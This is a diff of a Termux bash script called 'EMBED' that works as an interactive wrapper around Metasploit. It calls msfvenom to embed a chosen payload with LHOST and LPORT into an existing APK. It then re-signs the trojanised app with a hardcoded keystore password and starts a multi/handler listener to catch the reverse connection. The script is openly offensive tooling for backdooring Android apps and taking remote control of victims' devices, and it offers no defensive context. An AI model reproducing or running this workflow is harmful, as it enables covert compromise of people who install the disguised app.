@@ -1,7 +1,7 @@
 #!/data/data/com.termux/files/usr/bin/bash
 set -euo pipefail
 IFS=$'\n\t'
-trap ctrl_c 2
+#trap ctrl_c 2
 function ctrl_c () {
                 echo "
 		"
@@ -27,7 +27,7 @@ function Banner {
 	echo "   | ____|  \/  | __ )| ____|  _ \ "
 	echo "   |  _| |      |  _ \|  _| | | | |"
 	echo "   | |___| |\/| | |_) | |___| |_| |"
-	echo "   |_____|_|  |_|____/|_____|____/ v.1.0"
+	echo "   |_____|_|  |_|____/|_____|____/ v.1.5"
 	printf "$W
 	\n"
 }
@@ -95,30 +95,160 @@ printf "$C [Set]$G NAMED YOUR .APK$W"
 		printf "\n $R
 		[W] O-ops!! Please set a name
 		$W \n"
-			if [ ! -e $MYAPK ]; then
-                                printf "$R [W] O-ops!! The apk files doesn't exist
-                                $W \n"
-				sleep 2
-				SET
-                        fi
 	done
+sleep 1
+	Check
 }
-
+function Check {
+	Banner
+	printf "$C [IbyC]$M Is the setting correct ?
+	"
+	sleep 1
+printf "$Y [!]$G L-APK   =$W $APK \n"
+printf "$Y	 [!]$G PAYLOAD =$W $PAYLOAD \n"
+printf "$Y	 [!]$G LHOST   =$W $LHOST \n"
+printf "$Y	 [!]$G LPORT   =$W $LPORT \n"
+printf "$Y	 [!]$G YourApk =$W $MYAPK \n"
+echo 
+	while read -p "(y|Y/n|N) >> " yesorno && [ -z $yesorno ]; do
+		printf "\n $R
+		[W] O-ops!! Please answer the question
+		$W \n"
+	done
+		if [ $yesorno = 'y' -o $yesorno = 'Y' ] ; then
+			Payload
+		else
+			SET
+		fi
+}
+function Payload {
+	Banner
+	printf "$C [IbyC]$M Creating payload . . .$W
+	"
+	msfvenom -x $APK -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT
+	sleep 2
+        sign
+}
+function sign {
+	Banner
+	printf "$C [IbyC]$M Choose a type of signature
+	\n"
+	printf "$C [1]$G Jarsigner \n"
+	printf "$C [2]$G Apksigner$W
+	\n"
+	while read -p "(1/2) >> " SIGN && [ -z $SIGN ]; do
+		printf "$R
+		[W] Please, choose an option
+		\n $W"
+	done
+	
+	if [ $SIGN -eq '1' ]; then
+		echo
+		printf "$C [IbyC]$M Signing the .Apk with signapk tool. . .$W \n"
+		cd $TMP_DIR/openjdk
+                sleep 3
+		signapk publickey.x509.pem publickey.pk8 $TMP_DIR/unsign/output.apk $TMP_DIR/finished/$MYAPK
+                rm $TMP_DIR/unsign/output.apk
+		cd $HOME
+		echo
+		printf "$G \n \t DONE!!
+		$W"
+		sleep 1
+		Ending
+	elif [ $SIGN -eq '2' ]; then
+		printf "$C [IbyC]$M Signing the .Apk with apksigner tool. . .$W \n"
+		cd $TMP_DIR/unsign
+		sleep 3
+		apksigner -p Ivam3byCinderella keystore $TMP_DIR/unsign/output.apk $TMP_DIR/finished/$MYAPK
+		rm $TMP_DIR/unsign/output.apk
+		cd $HOME
+		printf "$G \n \t DONE!!
+		$W"
+		sleep 1
+		Ending
+	else
+			sign
+	fi
+}
+function Set_Handler {
+	Banner
+	printf "$C \n [Set]$G LOCAL HOST$W"
+		while read -p " >> " LHOST && [ -z $LHOST ]; do
+			printf "\n $R
+			[W] O-ops!! Please set a host
+			$W \n"
+		done
+	printf "$C [Set]$G LOCAL PORT$W"
+		while read -p " >> " LPORT && [ -z $LPORT ]; do
+			printf "\n $R
+			[W] O-ops!! Please set a local port
+			$W \n"
+		done
+	Banner
+	printf "$C [IbyC]$M Is the setting correct?
+	"
+        sleep 1
+        printf "$Y [!]$G PAYLOAD =$W $PAYLOAD \n"
+	printf "$Y         [!]$G LHOST   =$W $LHOST \n"
+	printf "$Y         [!]$G LPORT   =$W $LPORT \n"
+	echo
+		while read -p "(y|Y/n|N) >> " yesorno && [ -z $yesorno ]; do
+			printf "\n $R
+			[W] O-ops!! Please answer the question
+			$W \n"
+		done
+			if [ $yesorno = 'y' -o $yesorno = 'Y' ] ; then
+				Msfconsole
+			else
+				Set_Handler
+			fi
+}
 function Msfconsole {
+	Chao_chao
 	echo
 	printf "$C [IbyC]$M Starting msfconsole . . .$W"
-                                echo "
-                                "
-				touch $TMP_DIR/handler/$MYAPK.rc
-					echo "use multi/handler" >> $TMP_DIR/handler/$MYAPK.rc
-					echo "set PAYLOAD $PAYLOAD" >> $TMP_DIR/handler/$MYAPK.rc
-					echo "set LHOST $LHOST" >> $TMP_DIR/handler/$MYAPK.rc
-					echo "set LPORT $LPORT" >> $TMP_DIR/handler/$MYAPK.rc
-					echo "run" >> $TMP_DIR/handler/$MYAPK.rc
-					chmod 777 $TMP_DIR/handler/$MYAPK.rc
-					echo "
-					"
-                                        msfconsole -q -r $TMP_DIR/handler/$MYAPK.rc
+	echo
+	touch $TMP_DIR/handler/$MYAPK.rc
+	echo "use multi/handler" >> $TMP_DIR/handler/$MYAPK.rc
+	echo "set PAYLOAD $PAYLOAD" >> $TMP_DIR/handler/$MYAPK.rc
+	echo "set LHOST $LHOST" >> $TMP_DIR/handler/$MYAPK.rc
+	echo "set LPORT $LPORT" >> $TMP_DIR/handler/$MYAPK.rc
+	echo "run" >> $TMP_DIR/handler/$MYAPK.rc
+	chmod 777 $TMP_DIR/handler/$MYAPK.rc
+	echo "
+	"
+	msfconsole -q -r $TMP_DIR/handler/$MYAPK.rc
+}
+function Ending {
+	printf "$C \n
+[IbyC]$M Do you wanna start msfconsole handler?$W
+	\n"
+        while read -p "(y|Y/n|N) >> " yesorno && [ -z $yesorno ]; do
+                printf "\n $R
+                [W] Please, choose an option
+                $W \n"
+        done
+                if [ $yesorno = 'y' -o $yesorno = 'Y' ] ; then
+                        Banner
+                        printf "$C [IbyC]$M Do you wanna use the previous configuration ?$W
+                        \n"
+                        while read -p "(y|Y/n|N) >> " yesorno && [ -z $yesorno ]; do
+                                printf "$R
+                                [W] Please, choose an option
+                                $W \n"
+                        done
+                        if [ $yesorno = 'y' -o $yesorno = 'Y' ] ; then
+                                Msfconsole
+                        else
+                                Set_Handler
+                        fi
+                else
+                        Chao_chao
+                        printf "$C [IbyC]$G Thanks to use my EMBED tool$W
+                        \n"
+                        printf "$C [IbyC]$G Have a nice hacking day!!
+                $W \n"
+        fi
 }
 
 echo $(clear)
@@ -162,76 +292,4 @@ printf "$R       [-] Use At Your Own Risk [-]"
         echo "
 
         "
-Banner
-printf "$C [IbyC]$M Creating payload . . .$W
-"
-	msfvenom -x $APK -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT
-		
-printf "$C [IbyC]$M Signing the .Apk . . .$W"
-	cd $HOME/java/unsign
-	sleep 3
-	apksigner -p Ivam3byCinderella keystore $TMP_DIR/unsign/output.apk $TMP_DIR/finished/$MYAPK
-	sleep 3
-	rm $TMP_DIR/unsign/output.apk
-	cd $HOME
-        
-review=$(find $TMP_DIR/finished/ -name "$MYAPK")
-	if [ -z $review ]; then
-		Chao_chao
-		printf "$R \n [W] O-ops!! Something was wrong \n $Y [!] If you need a help come to my feedback group in Telegram \n $B     >> https://t.me/Ivam3by_Cinderella
-                $W \n"
-	else
-		Chao_chao
-		printf "$Y \n [!] Finished !! \n \t $C You can find$G $MYAPK $C in$W $TMP_DIR/finished
-		\n"
-	fi
-
-printf "$C [IbyC]$M Do you wanna start msfconsole handler?$W
-\n"
-	while read -p " (y|Y/n|N) >> " yesorno && [ -z $yesorno ]; do
-		printf "\n $R
-		[W] Please, choose an option
-		$W \n"
-done
-                if [ $yesorno = 'y' -o $yesorno = 'Y' ] ; then
-                        Chao_chao
-			printf "$C [IbyC]$M Do you wanna use the previous configuration ?$W
-			\n"
-			while read -p " (y|Y/n|N) >> " yesorno && [ -z $yesorno ]; do
-				printf "\n $R
-				[W] Please, choose an option
-				$W \n"
-			done
-			if [ $yesorno = 'y' -o $yesorno = 'Y' ] ; then
-				Chao_chao
-				Msfconsole
-			else
-				printf "$C [Set]$G PAYLOAD$W"
-				while read -p " >> " PAYLOAD && [ -z $PAYLOAD ]; do
-					printf "\n $R
-					[W] O-ops!! Please set a payload
-					$W \n"
-				done
-				printf "$C [Set]$G LOCAL HOST$W"
-				while read -p " >> " LHOST && [ -z $LHOST ]; do
-					printf "\n $R
-					[W] O-ops!! Please set a host
-					$W \n"
-				done
-				printf "$C [Set]$G LOCAL PORT$W"
-				while read -p " >> " LPORT && [ -z $LPORT ]; do
-					printf "\n $R
-					[W] O-ops!! Please set a local port
-					$W \n"
-				done
-				Msfconsole
-			fi
-
-                else
-			printf "$C [IbyC]$G Thanks to use my EMBED tool$W
-			\n"
-			printf "$C [IbyC]$G Have a nice hacking day!!
-		$W \n"
-	fi
-
 #					@IbyC.
